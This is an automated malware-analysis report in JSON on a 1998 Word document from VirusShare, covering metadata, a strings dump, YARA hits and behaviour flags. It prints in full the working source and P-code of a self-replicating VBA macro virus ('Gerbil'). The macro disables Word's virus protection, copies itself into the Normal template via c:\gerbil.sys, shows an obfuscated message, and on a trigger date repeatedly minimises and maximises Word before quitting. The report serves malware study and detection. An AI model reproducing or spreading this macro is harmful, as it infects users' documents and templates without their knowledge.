{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code"
        },
        "macro": "Sub AutoOpen()\n\nOn Error GoTo 75\n\nI = 0\n\nOptions.VirusProtection = False\n\nOptions.SaveNormalPrompt = False\n\nOptions.ConfirmConversions = False\n\nIf Day(13) And Month(11) Then Call \u00a9\n\ngx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines\n\nxg = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines\n\nIf xg > 94 And gx > 0 Then GoTo 75\n\nIf xg < 94 Then\n\n Set bg = NormalTemplate.VBProject.VBComponents.Item(1)\n\n ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name\n\n ActiveDocument.VBProject.VBComponents.Item(1).Export \"c:\\gerbil.sys\"\n\nEnd If\n\nIf gx = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)\n\n Infection = Int(Rnd * 50)\n\n If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(71) + Chr(69) + Chr(82) + Chr(66) + Chr(73) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)\n\n bg.codemodule.AddFromFile (\"c:\\gerbil.sys\")\n\n With bg.codemodule\n\n    For x = 1 To 4\n\n    .deletelines 1\n\n    Next x\n\n End With\n  \n If xg < 94 Then\n\n    With bg.codemodule\n\n    .replaceline 1, \"Sub AutoClose()\"\n\n    .replaceline 99, \"Sub ToolsMacro()\"\n       \n    rd = Int(Rnd * 100)\n\nIf rd = 99 Then .replaceline 69, \".replaceline x, \"\"'\"\" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow\"\n    \nEnd With\n\n End If\n\n With bg.codemodule\n\n    For x = 2 To 96 Step 2\n\n    .replaceline x, \"'\" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow\n\n    Next x\n\n End With\n\n75:\n\n If xg > 94 And gx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n\nEnd Sub\n\nPrivate Sub \u00a9()\n\nTop:\n\nI = I + 1\n\nOn Error Resume Next\n\nApplication.WindowState = wdWindowStateMinimize\n\nApplication.WindowState = wdWindowStateMaximize\n\nIf I < 10 Then GoTo Top\n\nApplication.Quit\n\nEnd Sub\n\nSub ViewVBCode()\n\nEnd Sub\n\n\n\n\n\n\n' Processing file: VirusShare_0e7303224dacf21cdcebddcc4a03e828\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 4766 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoOpen())\n' Line #1:\n' Line #2:\n' \tOnError 75 \n' Line #3:\n' Line #4:\n' \tLitDI2 0x0000 \n' \tSt I \n' Line #5:\n' Line #6:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #7:\n' Line #8:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #9:\n' Line #10:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #11:\n' Line #12:\n' \tLitDI2 0x000D \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x000B \n' \tArgsLd Month 0x0001 \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tArgsCall (Call) \u00a9 0x0000 \n' \tEndIf \n' Line #13:\n' Line #14:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt gx \n' Line #15:\n' Line #16:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt xg \n' Line #17:\n' Line #18:\n' \tLd xg \n' \tLitDI2 0x005E \n' \tGt \n' \tLd gx \n' \tLitDI2 0x0000 \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo 75 \n' \tEndIf \n' Line #19:\n' Line #20:\n' \tLd xg \n' \tLitDI2 0x005E \n' \tLt \n' \tIfBlock \n' Line #21:\n' Line #22:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet bg \n' Line #23:\n' Line #24:\n' \tLd bg \n' \tMemLd New \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tMemSt New \n' Line #25:\n' Line #26:\n' \tLitStr 0x000D \"c:\\gerbil.sys\"\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #27:\n' Line #28:\n' \tEndIfBlock \n' Line #29:\n' Line #30:\n' \tLd gx \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet bg \n' \tEndIf \n' Line #31:\n' Line #32:\n' \tLd Rnd \n' \tLitDI2 0x0032 \n' \tMul \n' \tFnInt \n' \tSt Infection \n' Line #33:\n' Line #34:\n' \tLd Infection \n' \tLitDI2 0x0031 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0047 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0045 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0052 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0042 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0049 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x004C \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0042 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0079 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0020 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0056 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0069 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0052 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0075 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLitDI2 0x0053 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tArgsCall MsgBox 0x0001 \n' \tEndIf \n' Line #35:\n' Line #36:\n' \tLitStr 0x000D \"c:\\gerbil.sys\"\n' \tParen \n' \tLd bg \n' \tMemLd codemodule \n' \tArgsMemCall AddFromFile 0x0001 \n' Line #37:\n' Line #38:\n' \tStartWithExpr \n' \tLd bg \n' \tMemLd codemodule \n' \tWith \n' Line #39:\n' Line #40:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tFor \n' Line #41:\n' Line #42:\n' \tLitDI2 0x0001 \n' \tArgsMemCallWith deletelines 0x0001 \n' Line #43:\n' Line #44:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #45:\n' Line #46:\n' \tEndWith \n' Line #47:\n' Line #48:\n' \tLd xg \n' \tLitDI2 0x005E \n' \tLt \n' \tIfBlock \n' Line #49:\n' Line #50:\n' \tStartWithExpr \n' \tLd bg \n' \tMemLd codemodule \n' \tWith \n' Line #51:\n' Line #52:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000F \"Sub AutoClose()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #53:\n' Line #54:\n' \tLitDI2 0x0063 \n' \tLitStr 0x0010 \"Sub ToolsMacro()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #55:\n' Line #56:\n' \tLd Rnd \n' \tLitDI2 0x0064 \n' \tMul \n' \tFnInt \n' \tSt rd \n' Line #57:\n' Line #58:\n' \tLd rd \n' \tLitDI2 0x0063 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0045 \n' \tLitStr 0x008B \".replaceline x, \"'\" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow\"\n' \tArgsMemCallWith replaceline 0x0002 \n' \tEndIf \n' Line #59:\n' Line #60:\n' \tEndWith \n' Line #61:\n' Line #62:\n' \tEndIfBlock \n' Line #63:\n' Line #64:\n' \tStartWithExpr \n' \tLd bg \n' \tMemLd codemodule \n' \tWith \n' Line #65:\n' Line #66:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLitDI2 0x0060 \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #67:\n' Line #68:\n' \tLd x \n' \tLitStr 0x0001 \"'\"\n' \tLd Application \n' \tMemLd DisplayRecentFiles \n' \tConcat \n' \tLd Application \n' \tMemLd StartupPath \n' \tConcat \n' \tLd Application \n' \tMemLd ActiveDocument \n' \tConcat \n' \tLd Application \n' \tMemLd ActiveWindow \n' \tConcat \n' \tArgsMemCallWith replaceline 0x0002 \n' Line #69:\n' Line #70:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #71:\n' Line #72:\n' \tEndWith \n' Line #73:\n' Line #74:\n' \tLineNum 75 \n' \tBoS 0x0000 \n' Line #75:\n' Line #76:\n' \tLd xg \n' \tLitDI2 0x005E \n' \tGt \n' \tLd gx \n' \tLitDI2 0x0000 \n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #77:\n' Line #78:\n' \tEndSub \n' Line #79:\n' Line #80:\n' \tFuncDefn (Private Sub \u00a9())\n' Line #81:\n' Line #82:\n' \tLabel Top \n' Line #83:\n' Line #84:\n' \tLd I \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt I \n' Line #85:\n' Line #86:\n' \tOnError (Resume Next) \n' Line #87:\n' Line #88:\n' \tLd wdWindowStateMinimize \n' \tLd Application \n' \tMemSt WindowState \n' Line #89:\n' Line #90:\n' \tLd wdWindowStateMaximize \n' \tLd Application \n' \tMemSt WindowState \n' Line #91:\n' Line #92:\n' \tLd I \n' \tLitDI2 0x000A \n' \tLt \n' \tIf \n' \tBoSImplicit \n' \tGoTo Top \n' \tEndIf \n' Line #93:\n' Line #94:\n' \tLd Application \n' \tArgsMemCall Quit 0x0000 \n' Line #95:\n' Line #96:\n' \tEndSub \n' Line #97:\n' Line #98:\n' \tFuncDefn (Sub ViewVBCode())\n' Line #99:\n' Line #100:\n' \tEndSub \n' Line #101:\n' Line #102:\n' Line #103:\n' Line #104:\n' Line #105:\n"
    },
    "filename": "VirusShare_0e7303224dacf21cdcebddcc4a03e828",
    "filesize": 37376,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Author: Jim Harrisberg, Template: Normal.dot, Last Saved By: Jim Harrisberg, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Sat Aug 29 18:10:00 1998, Last Saved Time/Date: Sat Aug 29 18:13:00 1998, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "0e7303224dacf21cdcebddcc4a03e828",
        "sha1": "9ef704a9b7c3c24c6fb598e184f8615d606c5b7e",
        "sha256": "5e94624c2159fc54c2937c8e63736e5f9472ff15b8470f8780bc56d225b15be2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "PRIVATE",
            "HYPERLINK \"/News/Item/0,4,25852,00.html?st.ne.fd.mdh\"",
            "Pointcast changes HP's mind",
            "Once HP prohibited employees from using PointCast in the office, but now it's broadcasting company and industry-related news to hundreds.",
            "August 28, 7:45 p.m. PT ",
            "HYPERLINK \"/Categories/Index/0,3,4,00.html?st.ne.fd.mdh.cat\"",
            "in Business",
            "HYPERLINK \"/News/Item/0,4,25848,00.html?st.ne.fd.mdh\"",
            "Students to get a taste of Java",
            "Sun introduces an accredited training program designed to prepare students to become Sun-certified Java programmers.",
            "August 28, 4:55 p.m. PT ",
            "HYPERLINK \"/Categories/Index/0,3,3,00.html?st.ne.fd.mdh.cat\"",
            "in Intranets",
            "HYPERLINK \"/News/Item/0,4,25811,00.html?st.ne.fd.mdh\"",
            "U.S. markets rise, then tumble",
            "update After an early climb on Wall Street, stocks tumble following the lead of the falling Asian and European stock markets.",
            "August 28, 4:40 p.m. PT ",
            "HYPERLINK \"/Categories/Index/0,3,4,00.html?st.ne.fd.mdh.cat\"",
            "in Business",
            "HYPERLINK \"/News/Item/0,4,25843,00.html?st.ne.fd.mdh\"",
            "iMac debuts in Japan Saturday",
            "Mania over Apple's iMac has been growing in Japan, traditionally the second biggest market for Macintosh computers.",
            "August 28, 3:30 p.m. PT ",
            "HYPERLINK \"/Categories/Index/0,3,2,00.html?st.ne.fd.mdh.cat\"",
            "in Computing",
            "HYPERLINK \"/News/Item/0,4,25842,00.html?st.ne.fd.mdh\"",
            "Fox Sports Online beefs up",
            "Just in time for football season, Fox Sports Online is planning to kick off a newly designed site, in an effort to keep its rank in the online sports field.",
            "August 28, 3:25 p.m. PT ",
            "HYPERLINK \"/Categories/Index/0,3,1,00.html?st.ne.fd.mdh.cat\"",
            "in The Net",
            "/ =!",
            "/News/Item/0,4,25852,00.html?st.ne.fd.mdh",
            "/Categories/Index/0,3,4,00.html?st.ne.fd.mdh.cat",
            "/News/Item/0,4,25848,00.html?st.ne.fd.mdh",
            "/Categories/Index/0,3,3,00.html?st.ne.fd.mdh.cat",
            "/News/Item/0,4,25811,00.html?st.ne.fd.mdh",
            "/Categories/Index/0,3,4,00.html?st.ne.fd.mdh.cat",
            "/News/Item/0,4,25843,00.html?st.ne.fd.mdh",
            "/Categories/Index/0,3,2,00.html?st.ne.fd.mdh.cat",
            "/News/Item/0,4,25842,00.html?st.ne.fd.mdh",
            "/Categories/Index/0,3,1,00.html?st.ne.fd.mdh.cat",
            "Jim Harrisberg",
            "Normal.dot",
            "Jim Harrisberg",
            "Microsoft Word 8.0",
            "6Ep\u04fd",
            "Title",
            "_PID_GUID",
            "_PID_HLINKS",
            "@d4[p\u04fd",
            "@d4[p\u04fd",
            "`n[p\u04fd",
            "435e83695",
            "Gp(?",
            "3DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "AutoOpen*",
            "Documentj",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "Month",
            "gxp]",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "codemodule",
            "CountOfLines!\\",
            "NormalTemplateq",
            "Export",
            "Infection",
            "RndR",
            "MsgBoxR",
            "ChrK~",
            "AddFromFileu",
            "deletelines",
            "replaceline",
            "Application*",
            "DisplayRecentFiles",
            "StartupPathi",
            "ActiveWindow+",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Top5",
            "WindowState|",
            "wdWindowStateMinimize4a",
            "wdWindowStateMaximizeU",
            "Quit9",
            "ViewVBCode",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F34F7",
            "804A-0D3",
            "C-11D2-B",
            "C31-EBFC",
            "6608DA5D",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "PD,PJP\\VHBE\\(EX(",
            "CxN@UalCxNTax",
            " +\t,C",
            "OfficDO@`f",
            "G{2DF8D",
            "04C-5BFA",
            "-101B-BDE5@AA@4",
            "fPROGRA",
            "M FILES",
            "aOgO",
            "c:\\gerbil.sys",
            "c:\\gerbil.sys",
            "Sub AutoClose()",
            "Sub ToolsMacro()C@T",
            ".replaceline x, \"'\" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Sub Auto",
            "Open()",
            "On Err",
            "or GoTo T75\tII0",
            "tions.Vi",
            "rusProte>c",
            "Save",
            "Confirm",
            "0vers,",
            " Day(13)",
            " And Mon",
            "th(11) T",
            "hen Call ",
            "DDve",
            ".VB:j",
            "Compon",
            "s.Item(",
            "1).codem",
            "odule.Co",
            "untOfLinesA",
            "> 9401*> 0",
            "0Wf ",
            "@\t<A\t6! Sext b\"",
            "\"c:\\gerb@il.sys",
            "EmIf",
            "7*&Inf",
            " Int(R",
            "* 450",
            "ZMsgBox ",
            "Chr(32) +`",
            "11:7",
            "4WAddFromFi@(",
            "WithH(^(   F`|!g",
            "1 |4",
            ".de letela 1",
            "Next x",
            ".GNW",
            ".re`cA\"",
            " 1, \"ECl",
            "ToolsMacroB",
            "  rgB10B@",
            "\"'\"\" ",
            "& Applic2aA.V#",
            "thCoproc",
            "essorAva,il",
            "Heade",
            "`Windo~w",
            "w+E:2A:96 S`tep 28",
            "Dis`3yRe",
            "StartupP",
            "75:\"",
            "\u0358As ",
            "Full%(M!",
            "VP@@ OCTop",
            "nI@B/pRes q",
            "= wd",
            "Mini@w|0",
            "Max&",
            "I < 19c`",
            "pQuit1",
            "ViewVBCn",
            "MICROSOF",
            "T OFFICE",
            "MSO97.",
            "DLLHk# 8.0k",
            "BThis",
            "Document\"",
            "\"h@6s",
            "ThisDocument",
            "ID=\"{D270914B-3F28-11D2-BC33-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"9193E000E400E400E400E4\"",
            "DPB=\"282A599A5A9A5A9A\"",
            "GC=\"C2C0B3AB4CAC4CACB3\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00AP",
            "0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 470, 358, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.389533",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
